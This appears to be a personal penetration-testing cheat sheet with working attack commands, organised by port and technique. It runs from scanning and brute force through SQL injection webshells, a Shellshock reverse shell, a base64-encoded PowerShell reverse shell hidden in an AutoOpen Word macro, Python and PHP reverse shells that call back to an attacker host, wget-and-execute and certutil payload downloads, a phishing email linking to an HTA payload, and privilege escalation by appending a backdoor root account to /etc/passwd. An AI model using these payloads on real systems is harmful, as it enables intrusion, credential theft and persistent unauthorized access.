# QCA Refined

### Download Essential Tools

```bash
https://github.com/danielmiessler/SecLists; wget https://github.com/carlospolop/PEASS-ng/releases/download/20220508/linpeas.sh; wget https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx64.exe; wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt; git clone https://github.com/dionach/CMSmap; wget https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py; wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64; wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh; https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl; wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1; wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1; wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1; wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe; wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe; wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh; wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
```

### Export Target IP Address

```bash
export ip=$(cat ip.txt)
```

### Nmap scan (aggressive & full port scan)

```bash
echo 192.168.x.x > ip.txt; export ip=$(cat ip.txt); nmap $ip -sV -A -Pn -oN sVAPn.txt
```

```bash
export ip=$(cat ip.txt); nmap $ip -p- -Pn -oN pPn.txt
```

```bash
export ip=$(cat ip.txt); nmap -sU -p- -Pn -T4 $ip -oN sUpPn.txt
```

### Useful Page

[https://nets.ec/Main_Page](https://nets.ec/Main_Page)

---

### Port 21 - FTP Brute Force

Wordlist for FTP brute force available at:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt)

Always try **admin** as a possible username

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt && cat ftp-betterdefaultpasslist.txt| awk -F ':' '{print $1}' > ftp_usernames.txt && cat ftp-betterdefaultpasslist.txt| awk -F ':' '{print $2}' > ftp_passwords.txt
```

```bash
hydra -L ftp_usernames.txt -P ftp_passwords.txt $ip ftp -V -f
```

### FTP Recursive Download

```bash
wget -r ftp://user:pass@server.com/
```

### FTP Bounce Attack Downloading Files

```bash
get ..\\xampp\\passwords.txt
```

---

### Port 22 - Problems logging in with SSH

Server that requires diffie-hellman-group1-sha1:

[https://unix.stackexchange.com/questions/340844/how-to-enable-diffie-hellman-group1-sha1-key-exchange-on-debian-8-0](https://unix.stackexchange.com/questions/340844/how-to-enable-diffie-hellman-group1-sha1-key-exchange-on-debian-8-0)

[https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss)

```bash
ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss user@$ip
```

Still can’t login? Add the following to /etc/ssh/ssh_config

```bash
PubkeyAcceptedKeyTypes +ssh-dss
```

### Port 22 - Problems logging in with SSH (private key)

```bash
sign_and_send_pubkey: no mutual signature supported
```

Fix

```bash
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa $user@$ip
```

---

### Port 25 - SMTP User Enumeration

If **VRFY** doesn’t work, try **RCPT** and **EXPN**.

```bash
smtp-user-enum -M VRFY -D $subdomain.$com -U smtp_usernames.txt -t $ip
```

```bash
smtp-user-enum -M VRFY -D $subdomain.$com -U /usr/share/wordlists/metasploit/namelist.txt -t $ip
```

---

### Port 53 - DNS Enumeration

```bash
dig @$ip d.c any
```

PTR lookup

```bash
dig @$ip -x $ip
```

Followed by AXFR zone transfer

```bash
dig axfr @$ip d.c
```

---

### Port 80 - Enumeration Tips

1. Login Page
- Try default or common credentials, passwords that are service names, sqli and null byte injection (if there is registration page)
1. Brute Force Directories (i.e. Fuzzing)
- Some “hidden” directories are actually the machine’s name itself, use ffuf if it does not work then use gobuster
- There are a good deal of wordlists here:

[https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)

1. SQL Injection
- This is a good read for web pentesting, especially when it comes to SQL injection (mostly MSSQL)

[https://www.securityidiots.com/](https://www.securityidiots.com/)

1. If the above doesn’t work, try enumerating subdomains and use nikto
2. Websites that are running wordpress CMS can be scanned using wpscan while other CMS like Joomla, Drupal and Moodle can be scanned using cmsmap.py

### Curl

```bash
curl --path-as-is http://$ip/../../../etc/passwd -o passwd.txt
```

```bash
curl -G http://$ip/uploads/shell.php --data-urlencode "cmd=certutil -urlcache -split -f http://$ip/ncpp.exe" | html2text
```

Empty content length can be specified by using either of:

```bash
curl -X POST -d "" http://$ip
```

```bash
curl -s -i -X POST -H 'Content-Length: 0'
```

### Passive Web Directory Fuzzing

```bash
curl $ip -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
```

### Active Web Directory Fuzzing

```bash
ffuf -u "http://$ip/FUZZ" -w /usr/share/dirb/wordlists/common.txt
```

```bash
ffuf -mc all -fc 404 -u "http://$ip:10443/FUZZ" -w /usr/share/dirb/wordlists/common.txt
```

Detailed directory scan for hidden items

[https://github.com/OJ/gobuster/releases](https://github.com/OJ/gobuster/releases)

```bash
gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 50
```

### Subdomain Enumeration

```bash
ffuf -u http://domain.com/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host:FUZZ.domain.com" -fs 169
```

```bash
wfuzz -c -f domain.com -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "http://domain.com/" -H "Host: FUZZ.domain.com" --hl 39
```

### Additional Web Enumeration (dangerous files/CGI, cookies, etc.)

```bash
nikto +host $ip
```

### Webdav enabled

```bash
davtest -url http://$ip/ -auth 'user:pass'
```

### Wordpress

```html
wpscan --url http://$ip --enumerate vp
```

```bash
wpscan -u http://$ip/webservices/wp/ --enumerate p,t,u
```

[https://github.com/dionach/CMSmap](https://github.com/dionach/CMSmap)

```html
python3 cmsmap.py http://$ip
```

### Forgot Password PHP Page

Try

```bash
GET /forgot_pass.php?email=%0aid
```

### Shellshock Enumeration

```bash
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://$ip/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
```

Exploitation:

```bash
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/$kali_ip/443 0>&1' http://$ip/cgi-bin/admin.cgi
```

### SSRF (RFI) using Responder

```bash
responder -I tun0 -wv
```

---

### Port 443

Crack certificate password (.pfx)

```bash
pfx2john staff.pfx > staff.hash
```

### Port 110/143/995/993 - POP3/IMAP Enumeration

Banner grabbing

```bash
nc -nv $ip 110
```

```bash
nc -nv $ip 143
```

```bash
openssl s_client -connect $ip:995 -crlf -quiet
```

```bash
openssl s_client -connect $ip:993 -quiet
```

Enumerate further

```bash
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $ip
```

Read emails

```bash
for user in alice bob; do ( echo USER ${user}; sleep 2s; echo PASS 123; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC $ip 110; done
```

Read email contents

```bash
for user in alice; do ( echo USER ${user}; sleep 2s; echo PASS 123; sleep 2s; echo LIST; sleep 2s; echo RETR 1; sleep 2s; echo RETR 2; sleep 2s; echo quit) | nc -nvC $ip 110; done
```

Send email

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from someone@whatever.com --header "Subject: whatever" --body "its totally safe at http://$kali_ip/details.hta" --server $target_ip
```

```bash
sendmail -f someone@whatever.com -t target@whatever.com -s $target_ip -u "Subject: whatever" -m "its totally safe at http://$kali_ip/details.hta"
```

###

---

### Port 139,445 - SMB Enumeration

Run wireshark to see the SMB version

```bash
smbclient -L $ip
```

```bash
crackmapexecexec smb --shares $ip -u '' -p ''
```

```bash
crackmapexec smb --shares $ip -u 'guest' -p ''
```

```bash
 enum4linux -U -G -r $ip
```

```bash
smbmap -u '' -p '' -R -H $ip
```

```bash
smbget -U '' -R smb://$ip/$dir
```

```bash
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

---

### Brute Force Tools (Hydra, Medusa, Ncrack)

Simple Hydra Brute Force for specific services

> ftp, ssh, pop3, mysql
> 

```bash
hydra -L users.txt -P users.txt $ip ssh -V -f
```

```bash
hydra -L users.txt -P users.txt $ip ssh -vV -f -e nsr -I
```

```bash
hydra -L users.txt -P users.txt -e nsr -q ssh://$ip -t 4 -w 5 -V -f
```

```bash
medusa -h $ip -U users.txt -P users.txt -M ssh -e ns -f -g 5 -r 0 -b -t 2 -v 4
```

```bash
ncrack $ip -U users.txt -P users.txt -p ssh -f -v
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/folder/login.php:username=admin&password=^PASS^:Invalid Password!"
```

### MySQL Enumeration

```html
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip
```

### MSSQL Login

[https://amandinegh.gitbook.io/cyberadventure/common-services/mssql-3306](https://amandinegh.gitbook.io/cyberadventure/common-services/mssql-3306)

```bash
python3 mssqlclient.py -windows-auth DOMAIN/user:password@$ip
```

```bash
use MASTER
sp_configure 'show advanced options', '1'
RECONFIGURE
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
EXEC sp_configure 'show advanced options', 0
RECONFIGURE
```

xp_cmdshell to actual shell

```bash
xp_cmdshell copy \\$kali_ip\SHARE\nc.exe C:\Users\Public\nc.exe
```

```bash
xp_cmdshell c:\Users\Public\nc.exe -e cmd.exe $kali_ip 80
```

### MSSQL Injection

xp_cmdshell (MSSQL to RCE)

[https://guide.offsecnewbie.com/5-sql](https://guide.offsecnewbie.com/5-sql)

[https://c0deman.wordpress.com/2013/06/25/mssql-injection-cheat-sheet/](https://c0deman.wordpress.com/2013/06/25/mssql-injection-cheat-sheet/)

[https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

[https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)

### SQL Injection to RCE

Peep at usernames in the table.

```bash
SELECT username FROM users WHERE username = '' AND 1= (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)-- -
```

Inject RCE.

```bash
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/backdoor.php'  --
```

```bash
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'
```

### SQL Injection Cheatsheet

```bash
admin'||'1==1--
```

```bash
admin' || '1==1//
```

### SQL Injection to get user data (MariaDB)

```bash
' AND 1=2 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='user'--
```

### Union based SQL Injection

[http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html)

### MongoDB Login

```bash
mongo -u $user -p $pass localhost:27017/$db
```

### SSTI Injection (Java)

[https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md)

```bash
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget $kali_ip/r.elf")}
```

### .GIT Enumeration

In the .git directory:

```bash
git ls-files --stage
```

```bash
git log
```

### RPC Enumeration

```bash
rpcclient -U "" -N $ip
```

### LDAP Enumeration

Great article to read up

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

```bash
ldapsearch -v -x -b "DC=$domain,DC=$com" -H "ldap://$ip" "(objectclass=*)"
```

```bash
ldapsearch -x -h $ip -D '' -w '' -b "DC=$domain,DC=$com" | grep sAMAccountName
```

```bash
ldapsearch -x -h $ip -D '' -w '' -b "DC=$domain,DC=$com" | grep description
```

Enumerate usernames given password

```bash
ldapsearch -x -H ldap://sub.domain.com -D 'DOMAIN\ldap' -w '$pass' -b "CN=Users,DC=$DOMAIN, DC=$COM" | tee saved.txt
```

```bash
ldapdomaindump -u 'DOMAIN\ldap' -p '$pass' sub.domain.com
```

Followed by CTRL + F the domain_user.json file for “info” to see if there’s passwords.

### WinDAP Search

[https://github.com/ropnop/windapsearch](https://github.com/ropnop/windapsearch)

Enumerate all users

```bash
python3 windapsearch.py -d domain.com --dc-ip $ip -U
```

```bash
python3 windapsearch.py -u "" --dc-ip $ip -U --admin-objects
```

Enumerate all other objects

```bash
python3 windapsearch.py -d domain.com --dc-ip $ip --custom "objectClass=*"
```

Enumerate users in “Remote Management Users”

```bash
python3 windapsearch.py -u "" --dc-ip $ip -U -m "Remote Management Users"
```

### IFC Enumeration

Grab [**ircsnapshot.py**](http://ircsnapshot.py) at:

[https://raw.githubusercontent.com/bwall/ircsnapshot/master/ircsnapshot/ircsnapshot.py](https://raw.githubusercontent.com/bwall/ircsnapshot/master/ircsnapshot/ircsnapshot.py)

```bash
python2 ircsnapshot.py
```

### IRC Enumeration (Unreal)

```bash
irssi -c $ip -n guest
```

### [Usernamer.py](http://Usernamer.py) - Jumble up to get naming conventions

[https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py](https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py)

```bash
python2 usernamer.py -n '$name $surname' >> smtp_usernames.txt
```

### Cewl - Extract keywords/texts from web service to get possible password list

```bash
cewl -d 5 http://$ip/$page -w pop_passwords.txt
```

### Found .git in website?

```bash
wget --mirror -I .git $ip/.git; cd $ip
```

```bash
git checkout -- .; ls
```

### Inaccessible git files? Extract using gitdumper.sh

[https://pentestbook.six2dez.com/enumeration/webservices/github](https://pentestbook.six2dez.com/enumeration/webservices/github)

```bash
./gitdumper.sh http://$ip/.git/ git
```

```bash
cd git
```

```bash
git checkout -- .
```

### URLdecode + Base64decode

```bash
echo -n $encoded_string |  "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));" | base64 -dn
```

### Base64encode + URLencode

```bash
urlencode $(echo -n admin | base64)
```

### Tar Unzip

```bash
tar -xf $file
```

### Find recursively for a specific word

```bash
grep -i -r 'password' .
```

### Find recursively for a specific filename

```bash
ls -R | grep -i $filename
```

### Node.js running?

Try to look out for a forum post and test input fields by supplying **1+1** to check the existence of **eval**.

### PHP replace function suspected? Profanity filter regex? preg_replace()?

[https://isharaabeythissa.medium.com/command-injection-preg-replace-php-function-exploit-fdf987f767df](https://isharaabeythissa.medium.com/command-injection-preg-replace-php-function-exploit-fdf987f767df)

### Vulnerable to File Extension rename?

E.g. only accept GIF files, use burp to intercept uploading of php-reverse-shell.php and change content-type from

```bash
Content-Type: application/x-php
```

to

```bash
Content-Type: image/gif
```

### Macros

[https://www.thedecentshub.tech/2021/08/reverse-shell-from-word-documents.html?m=1](https://www.thedecentshub.tech/2021/08/reverse-shell-from-word-documents.html?m=1)

[https://redtm.com/initial-access/microsoft-word-macro-payload/](https://redtm.com/initial-access/microsoft-word-macro-payload/)

> Open MSWord **File → Options → Customize Ribbon → Enable Developer Options**
> 

```bash
Sub processing()
'
' processing Macro
'
'
    Dim Str As String
    
    Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
    Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
    Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
    Str = Str + "MQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQAzADQAIgAsADQANA"
    Str = Str + "AzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBu"
    Str = Str + "AHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AG"
    Str = Str + "UAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUA"
    Str = Str + "MwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQ"
    Str = Str + "AgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABl"
    Str = Str + "AHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AG"
    Str = Str + "gAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0A"
    Str = Str + "IAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATg"
    Str = Str + "BhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBD"
    Str = Str + "AEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAG"
    Str = Str + "kAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQA"
    Str = Str + "cwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQ"
    Str = Str + "B0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBu"
    Str = Str + "AGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAH"
    Str = Str + "MAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAA"
    Str = Str + "KABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJA"
    Str = Str + "BzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBl"
    Str = Str + "AG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAG"
    Str = Str + "UAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkA"
    Str = Str + "OwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbg"
    Str = Str + "BkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBM"
    Str = Str + "AGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AH"
    Str = Str + "MAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUA"
    Str = Str + "KAApAA=="
ce    
    CreateObject("Wscript.shell").Run Str

End Sub
Sub AutoOpen()
    processing
End Sub
```

### Unprotect Spreadsheet (xlsx)

[http://www.excelsupersite.com/how-to-remove-an-excel-spreadsheet-password-in-6-easy-steps/](http://www.excelsupersite.com/how-to-remove-an-excel-spreadsheet-password-in-6-easy-steps/)

```bash
unzip bla.xlsx
sed -i 's/<sheetProtection[^>]*>//' xl/worksheets/sheet2.xml
zip -fr bla.xlsx *
```

### EXIF Tool

```bash
https://github.com/convisolabs/CVE-2021-22204-exiftool
```

### RCE Generator

[https://www.revshells.com/](https://www.revshells.com/)

```bash
curl -G http://$ip/uploads/shell.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$kali_ip/443 0>&1'"
```

### Python Reverse Shell Codes

```bash
import pty
import socket
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$kali_ip",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```

### PowerShell Reverse Shell

```bash
wget https://raw.githubusercontent.com/rioasmara/wordpress/master/rev.ps1
```

```bash
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://$kali_ip/rev.ps1") | powershell -noprofile'
```

### HTA Reverse Shell

[https://lisandre.com/archives/11205](https://lisandre.com/archives/11205)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=${KALI_IP} LPORT=${LISTENER_PORT} -f hta-psh -o /var/www/html/poc_hta.hta
```

### Payload List

[https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)

### PHAR proc_open (PHP alternative) RCE (without using fsockopen)

[https://www.php.net/manual/en/function.proc-open.php](https://www.php.net/manual/en/function.proc-open.php)

```bash
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], 'rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $kali_ip 80 >/tmp/f');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
```

### Tomcat Manager Authenticated WAR File Upload Exploit

[https://github.com/thewhiteh4t/warsend](https://github.com/thewhiteh4t/warsend)

```bash
./warsend.sh $kali_ip 443 $ip 8080 tomcat s3cret revshell
```

### Grafana Exploit

```bash
python3 50581.py -H http://$ip:3000
```

Read grafana creds

```bash
/etc/grafana/grafana.ini
```

Dump SQLite database

```bash
curl --path-as-is http://$ip:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
```

Fire sqlitebrowser → right-click data_source for potential passwords and login through MySQL

```bash
mysql -u grafana -pP@ssw0rd! -h $ip
```

### EternalBlue Reads

[https://github.com/k4u5h41/MS17-010_CVE-2017-0143](https://github.com/k4u5h41/MS17-010_CVE-2017-0143)

```bash
git clone https://github.com/k4u5h41/MS17-010_CVE-2017-0143
```

[https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-windows-xp-with-custom-payload-fabbbbeb692f](https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-windows-xp-with-custom-payload-fabbbbeb692f)

[https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-window-7-and-higher-custom-payload-efd9fcc8b623](https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-window-7-and-higher-custom-payload-efd9fcc8b623)

### Evil-WINRM

```bash
evil-winrm -i comp.domain.com -u user -p pass
```

Share files

```bash
net use \\$kali_ip\EVILSHARE
cd \\$kali_ip\EVILSHARE
```

### Evil-WINRM (SSL)

Note: if have PFX file, we can evil-winrm without password

```bash
openssl pkcs12 -in bla.pfx -nocerts -out key.pem -nodes
```

```bash
openssl pkcs12 -in bla.pfx -nokeys -out cert.pem
```

```bash
evil-winrm -i $ip -c cert.pem -k key.pem -S
```

### MSFV Shells

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$myip LPORT=$myport -f elf -o shell
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$myip LPORT=$myport -f exe > shell.exe
```

```bash
msfvenom -p php/shell/reverse_tcp LHOST=$myip LPORT=$myport -f raw
```

### Certutil

```bash
certutil -urlcache -split -f http://$ip/nc.exe
```

```bash
<?php 
$exec = system('certutil.exe -urlcache -split -f "http://$myip/shell.exe" shell.exe', $val); 
?>
```

### Wget shell and execute one-liner

```bash
wget -P /tmp http://kali/shell && chmod +x /tmp/shell && /tmp/shell
```

### Transfer file using NC

Receiver:

```bash
nc -l -p 80 > file
```

Sender:

```bash
nc -w 3 $ip 80 < file
```

### Transfer file using shares

Attacker:

```bash
python3 smbserver.py EVILSHARE /home/kali/experiment
```

Victim:

```bash
copy \\ip-addr\share-name\file out-file
```

If not working, use the **-smb2support** option or use samba.

[https://ubuntu.com/server/docs/samba-file-server](https://ubuntu.com/server/docs/samba-file-server)

### Zip file password cracking

fcrackzip

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret_files.zip
```

john

```bash
zip2john secret.zip > hash.txt
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Python TTY Shell Spawn

```powershell
python -c "import pty; pty.spawn('/bin/bash');"
```

```bash
python3 -c "import pty; pty.spawn('/bin/bash');"
```

### Shell upgrade using SSH

1. On attacking machine, generate SSH key pair

```bash
ssh-keygen -t rsa -N '' -f /home/kali/.ssh/id_rsa
```

1. Copy public SSH key to the target and save it as /home/<target_user>/.ssh/authorized_keys

attacking machine:

```bash
cd .ssh
python3 -m http.server 80 
```

target machine:

```bash
mkdir /home/<target_user>/.ssh
wget http://$attacker_ip/id_rsa.pub -O /home/<target_user>/.ssh/authorized_keys
```

1. SSH to the target

```bash
ssh -o StrictHostKeyChecking=no <target_user>@$ip
```

### Decrypt RSA Keys

Example/sample of encrypted RSA keys

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
...
-----END RSA PRIVATE KEY-----
```

Obtain public key (if necessary use ssh2john to crack the password for the passphrase)

```bash
openssl rsa -in encrypted.key -pubout > key.pub
```

Obtain private key (if necessary use ssh2john to crack the password for the passphrase)

```bash
openssl rsa -in encrypted.key -out id_rsa
```

## Shell upgrade using SSH (2)

1. On the target.

```bash
mkdir /home/user/.ssh
chmod 0700 /home/user/.ssh
echo "ssh-rsa AAAAB3...SNj7NAs = kali@kali" > /home/user/.ssh/authorized_keys
chmod 0600 /home/user/.ssh/authorized_keys
```

1. On kali.

```bash
ssh user@ip
```

### Powershell download file

```bash
powershell.exe (New-Object System.Net.WebClient).DownloadFile("http://$yourip/$file", "C:\Users\$destfile")
```

```bash
powershell.exe Invoke-WebRequest -OutFile $destfile -Uri http://$yourip/$file
```

### Docker Container Enumeration

1. Check if you are in docker container

```bash
$ hostname
a7c367c2113d
```

1. In Docker containerization, file systems are often mounted between the host and a container. Check for file system mounts.

```bash
$ mount
/dev/sda1 on /tmp type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```

1. Double confirm

```bash
df -T /tmp
Filesystem     Type 1K-blocks    Used Available Use% Mounted on
/dev/sda1      ext4  16446332 4431884  11159308  29% /tmp
```

### LinPEAS/WinPEAS

[https://github.com/carlospolop/PEASS-ng/releases/tag/20220508](https://github.com/carlospolop/PEASS-ng/releases/tag/20220508)

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220508/linpeas.sh
```

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx64.exe
```

### Linux Smart Enumeration Script

An alternative to linPEAS.

[https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

### PrivEsc Guide Linux

[https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html](https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html)

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
sudo -l
```

```bash
cat /etc/crontab
```

```bash
find / -perm -u=s -type f 2>/dev/null
```

```bash
netstat -tunlp
```

```bash
ss -tunlp
```

```bash
cat ~/.profile && cat ~/.bashrc
```

```bash
ls -la /var/backups
```

### Linux Kernel Exploits Binaries

[https://github.com/m0mkris/linux-kernel-exploits](https://github.com/m0mkris/linux-kernel-exploits)

An alternative to view running processes as non-root user

[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

id shows that you’re in a non-default group? Find all files that are owned by this group.

```bash
find / -group $groupname 2>/dev/null
```

```bash
echo 'hacked:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:test:/root:/bin/bash' >> /etc/passwd
```

### Create /etc/passwd openssl password

```bash
openssl passwd -1 -salt salt password
```

### Run as a privilege group

```bash
sudo -g python_admin admin_python3
```

### Custom Python script found? - get capabilities

```bash
getcap /usr/bin/admin_python3
/usr/bin/admin_python3 = cap_setuid+ep
>>> import os
>>> os.setuid(0)
>>> os.system("bash")
```

### Escape Restricted Shell (using text editor)

```bash
$ ed
!/bin/sh
$ export PATH=/bin:/usr/bin
```

### Escape Restricted Environment (using at)

[https://gtfobins.github.io/gtfobins/at/#shell](https://gtfobins.github.io/gtfobins/at/#shell)

```bash
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

### Kernel Enum

```bash
cat /etc/issue
```

```bash
uname -a
```

Need to download if cross architecture.

```bash
apt install gcc-multilib -y
```

<aside>
💡 For exploit suggester 1: look at Exposure: highly probable

</aside>

[https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh)

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
```

<aside>
